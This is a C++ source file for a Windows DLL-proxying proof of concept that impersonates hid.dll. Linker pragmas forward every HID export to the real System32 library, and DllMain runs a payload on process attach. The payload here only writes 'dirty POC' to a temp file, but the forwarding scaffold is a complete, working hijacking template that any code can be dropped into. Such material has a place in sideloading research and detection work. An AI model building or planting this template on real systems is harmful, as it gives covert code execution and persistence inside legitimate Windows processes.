#include <Windows.h>
#include <iostream>

void Execution(void) {
	HANDLE hFile = CreateFile(L"C:\\Temp\\poc.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	std::string strText = "dirty POC";
	DWORD bytesWritten;
	WriteFile(hFile, strText.c_str(), strText.size(), &bytesWritten, nullptr);
	CloseHandle(hFile);
}

#pragma comment(linker, "/export:HidD_FlushQueue=\"C:\\Windows\\System32\\hid.HidD_FlushQueue\"")
#pragma comment(linker, "/export:HidD_FreePreparsedData=\"C:\\Windows\\System32\\hid.HidD_FreePreparsedData\"")
#pragma comment(linker, "/export:HidD_GetAttributes=\"C:\\Windows\\System32\\hid.HidD_GetAttributes\"")
#pragma comment(linker, "/export:HidD_GetConfiguration=\"C:\\Windows\\System32\\hid.HidD_GetConfiguration\"")
#pragma comment(linker, "/export:HidD_GetFeature=\"C:\\Windows\\System32\\hid.HidD_GetFeature\"")
#pragma comment(linker, "/export:HidD_GetHidGuid=\"C:\\Windows\\System32\\hid.HidD_GetHidGuid\"")
#pragma comment(linker, "/export:HidD_GetIndexedString=\"C:\\Windows\\System32\\hid.HidD_GetIndexedString\"")
#pragma comment(linker, "/export:HidD_GetInputReport=\"C:\\Windows\\System32\\hid.HidD_GetInputReport\"")
#pragma comment(linker, "/export:HidD_GetManufacturerString=\"C:\\Windows\\System32\\hid.HidD_GetManufacturerString\"")
#pragma comment(linker, "/export:HidD_GetMsGenreDescriptor=\"C:\\Windows\\System32\\hid.HidD_GetMsGenreDescriptor\"")
#pragma comment(linker, "/export:HidD_GetNumInputBuffers=\"C:\\Windows\\System32\\hid.HidD_GetNumInputBuffers\"")
#pragma comment(linker, "/export:HidD_GetPhysicalDescriptor=\"C:\\Windows\\System32\\hid.HidD_GetPhysicalDescriptor\"")
#pragma comment(linker, "/export:HidD_GetPreparsedData=\"C:\\Windows\\System32\\hid.HidD_GetPreparsedData\"")
#pragma comment(linker, "/export:HidD_GetProductString=\"C:\\Windows\\System32\\hid.HidD_GetProductString\"")
#pragma comment(linker, "/export:HidD_GetSerialNumberString=\"C:\\Windows\\System32\\hid.HidD_GetSerialNumberString\"")
#pragma comment(linker, "/export:HidD_Hello=\"C:\\Windows\\System32\\hid.HidD_Hello\"")
#pragma comment(linker, "/export:HidD_SetConfiguration=\"C:\\Windows\\System32\\hid.HidD_SetConfiguration\"")
#pragma comment(linker, "/export:HidD_SetFeature=\"C:\\Windows\\System32\\hid.HidD_SetFeature\"")
#pragma comment(linker, "/export:HidD_SetNumInputBuffers=\"C:\\Windows\\System32\\hid.HidD_SetNumInputBuffers\"")
#pragma comment(linker, "/export:HidD_SetOutputReport=\"C:\\Windows\\System32\\hid.HidD_SetOutputReport\"")
#pragma comment(linker, "/export:HidP_GetButtonCaps=\"C:\\Windows\\System32\\hid.HidP_GetButtonCaps\"")
#pragma comment(linker, "/export:HidP_GetCaps=\"C:\\Windows\\System32\\hid.HidP_GetCaps\"")
#pragma comment(linker, "/export:HidP_GetData=\"C:\\Windows\\System32\\hid.HidP_GetData\"")
#pragma comment(linker, "/export:HidP_GetExtendedAttributes=\"C:\\Windows\\System32\\hid.HidP_GetExtendedAttributes\"")
#pragma comment(linker, "/export:HidP_GetLinkCollectionNodes=\"C:\\Windows\\System32\\hid.HidP_GetLinkCollectionNodes\"")
#pragma comment(linker, "/export:HidP_GetScaledUsageValue=\"C:\\Windows\\System32\\hid.HidP_GetScaledUsageValue\"")
#pragma comment(linker, "/export:HidP_GetSpecificButtonCaps=\"C:\\Windows\\System32\\hid.HidP_GetSpecificButtonCaps\"")
#pragma comment(linker, "/export:HidP_GetSpecificValueCaps=\"C:\\Windows\\System32\\hid.HidP_GetSpecificValueCaps\"")
#pragma comment(linker, "/export:HidP_GetUsageValue=\"C:\\Windows\\System32\\hid.HidP_GetUsageValue\"")
#pragma comment(linker, "/export:HidP_GetUsageValueArray=\"C:\\Windows\\System32\\hid.HidP_GetUsageValueArray\"")
#pragma comment(linker, "/export:HidP_GetUsages=\"C:\\Windows\\System32\\hid.HidP_GetUsages\"")
#pragma comment(linker, "/export:HidP_GetUsagesEx=\"C:\\Windows\\System32\\hid.HidP_GetUsagesEx\"")
#pragma comment(linker, "/export:HidP_GetValueCaps=\"C:\\Windows\\System32\\hid.HidP_GetValueCaps\"")
#pragma comment(linker, "/export:HidP_InitializeReportForID=\"C:\\Windows\\System32\\hid.HidP_InitializeReportForID\"")
#pragma comment(linker, "/export:HidP_MaxDataListLength=\"C:\\Windows\\System32\\hid.HidP_MaxDataListLength\"")
#pragma comment(linker, "/export:HidP_MaxUsageListLength=\"C:\\Windows\\System32\\hid.HidP_MaxUsageListLength\"")
#pragma comment(linker, "/export:HidP_SetData=\"C:\\Windows\\System32\\hid.HidP_SetData\"")
#pragma comment(linker, "/export:HidP_SetScaledUsageValue=\"C:\\Windows\\System32\\hid.HidP_SetScaledUsageValue\"")
#pragma comment(linker, "/export:HidP_SetUsageValue=\"C:\\Windows\\System32\\hid.HidP_SetUsageValue\"")
#pragma comment(linker, "/export:HidP_SetUsageValueArray=\"C:\\Windows\\System32\\hid.HidP_SetUsageValueArray\"")
#pragma comment(linker, "/export:HidP_SetUsages=\"C:\\Windows\\System32\\hid.HidP_SetUsages\"")
#pragma comment(linker, "/export:HidP_TranslateUsagesToI8042ScanCodes=\"C:\\Windows\\System32\\hid.HidP_TranslateUsagesToI8042ScanCodes\"")
#pragma comment(linker, "/export:HidP_UnsetUsages=\"C:\\Windows\\System32\\hid.HidP_UnsetUsages\"")
#pragma comment(linker, "/export:HidP_UsageListDifference=\"C:\\Windows\\System32\\hid.HidP_UsageListDifference\"")

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		Execution();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
